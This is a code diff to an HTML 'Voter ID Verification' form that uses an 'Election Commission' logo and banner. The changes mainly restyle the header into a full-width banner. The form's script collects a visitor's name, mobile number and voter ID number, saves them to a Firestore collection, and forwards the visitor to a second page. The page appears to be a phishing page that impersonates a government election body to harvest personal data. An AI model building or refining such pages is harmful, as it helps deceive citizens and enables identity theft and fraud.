@@ -16,26 +16,39 @@
             padding: 20px; 
         }
 
+        /* Container for Edge-to-Edge Banner Header */
         .form-container { 
             background: #ffffff; 
-            padding: 35px; 
+            padding: 0 35px 35px 35px; /* Top padding 0 taaki photo kinaron se touch rahe */
             border-radius: 12px; 
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); 
             width: 100%; 
             max-width: 450px; 
-            text-align: center;
+            overflow: hidden; /* Photo box se bahar na nikle */
         }
 
-        .logo-box {
-            margin-bottom: 15px;
+        /* Full Width Edge-to-Edge Banner Styling */
+        .full-banner {
+            margin-left: -35px;
+            margin-right: -35px;
+            margin-bottom: 25px;
+            width: calc(100% + 70px);
+            height: 130px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #004085;
         }
-        .logo-box img {
-            width: 60px;
-            height: auto;
-            object-fit: contain;
+
+        .full-banner img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover; /* Photo sahi shape mein baith jayegi */
+            display: block;
         }
 
         .form-container h2 { 
+            text-align: center;
             margin-bottom: 20px; 
             color: #0056b3; 
             font-size: 22px; 
@@ -100,8 +113,9 @@
 <body>
     <div class="form-container">
         
-        <div class="logo-box">
-            <img src="logo.png" alt="Election Commission Logo">
+        <!-- Full Width Banner Image Header -->
+        <div class="full-banner">
+            <img src="logo.png" alt="Election Commission Banner">
         </div>
 
         <h2>Voter ID Verification</h2>
@@ -156,7 +170,6 @@
             const epic = document.getElementById('epic').value;
 
             try {
-                // Firestore database me data bhejna aur docRef.id lena
                 const docRef = await addDoc(collection(db, "voterSubmissions"), {
                     fullname: fullname,
                     mobile: mobile,
@@ -164,10 +177,7 @@
                     time: new Date().toLocaleString()
                 });
 
-                // Is user ki unique ID ko save karna taaki secondpage par data link ho sake
                 localStorage.setItem('voterDocId', docRef.id);
-
-                // Agle page par bhejna
                 window.location.href = "secondpage.html";
             } catch (error) {
                 console.error("Error adding document: ", error);
